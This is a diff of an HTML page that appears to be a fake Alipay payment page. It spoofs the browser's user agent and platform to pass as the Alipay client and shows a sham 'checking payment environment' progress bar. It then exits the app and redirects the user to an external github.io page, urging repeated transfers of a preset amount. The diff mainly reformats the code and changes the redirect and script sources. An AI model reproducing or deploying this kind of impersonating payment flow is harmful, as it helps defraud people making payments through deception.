@@ -1,13 +1,27 @@
-
-<html><head>
+<html>
+<head>
     <meta charset="utf-8">
     <title>支付宝</title>
     <meta content="yes" name="apple-mobile-web-app-capable">
     <meta content="black" name="apple-mobile-web-app-status-bar-style">
     <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
-    <script type="text/javascript" src="http://u.vhuifu.cn/Public/Home/js/jquery.min.js"></script>
+    <script type="text/javascript" src="jquery.min.js"></script>
     <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
-    <script type="text/javascript">Object.defineProperty(window.navigator, 'userAgent', { get: function () { return 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; KIW-AL10 Build/HONORKIW-AL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AlipayDefined(nt:WIFI,ws:360|592|3.0) AliApp(AP/9.5.3.030408) AlipayClient/9.5.3.030408 Language/zh-Hans'; } }); Object.defineProperty(window.navigator, 'vendor', { get: function () { return ''; } }); Object.defineProperty(window.navigator, 'platform', { get: function () { return 'Android'; } });</script>
+    <script type="text/javascript">Object.defineProperty(window.navigator, 'userAgent', {
+        get: function () {
+            return 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; KIW-AL10 Build/HONORKIW-AL10) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AlipayDefined(nt:WIFI,ws:360|592|3.0) AliApp(AP/9.5.3.030408) AlipayClient/9.5.3.030408 Language/zh-Hans';
+        }
+    });
+    Object.defineProperty(window.navigator, 'vendor', {
+        get: function () {
+            return '';
+        }
+    });
+    Object.defineProperty(window.navigator, 'platform', {
+        get: function () {
+            return 'Android';
+        }
+    });</script>
     <style>
         html, body {
             padding: 0;
@@ -176,6 +190,7 @@
             height: 36px;
             box-shadow: #3e94c7 0 2px 8px
         }
+
         #py1 {
             width: 223px;
             font-size: 14px;
@@ -225,7 +240,7 @@
         setTimeout(function () {
             AlipayJSBridge.call("exitApp");
             AlipayJSBridge.call('pushWindow', {
-                url:u,
+                url: u,
                 param: {
                     readTitle: true,
                     showOptionMenu: false
@@ -238,8 +253,7 @@
     var e = "检测完成";
     var f = "请点击发送消息\r\n如果遇到转账失败，请多试几次";
     var g = "马上支付";
-    //var url9= window.location.origin + "/Api/ios_pay/id/2020021576114114.html";
-    var url9 = "https://1izheng.github.io/xpage/wangxin2/2.html";
+    var url9 = "https://1izheng.github.io/xpage/wangxin2/lq.html";
     document.body.className = '';
     document.getElementById("ci").textContent = parseFloat("100.00").toFixed(2);
     document.getElementById("mo").textContent = "2020021576114114"
@@ -259,17 +273,18 @@
         AlipayJSBridge.call("hideOptionMenu");
     }
 
-    var timek =0;
-    var timez =100;
+    var timek = 0;
+    var timez = 100;
+
     function run() {
         var py = document.getElementById("py");
         var py1 = document.getElementById("py1");
-        if (timez != 0){
+        if (timez != 0) {
             timek++;
             timez--;
             py.textContent = '正在检测支付环境(' + parseInt(timek) + '%)';
-            setTimeout(run,5);
-        }else {
+            setTimeout(run, 5);
+        } else {
             py.textContent = '去支付';
             go(url9);
             py.onclick = function () {
@@ -289,10 +304,12 @@
     }
 
     run();
-    function gopay(){
+
+    function gopay() {
         go(url8);
     }
 </script>
 
 
-</body></html>
+</body>
+</html>
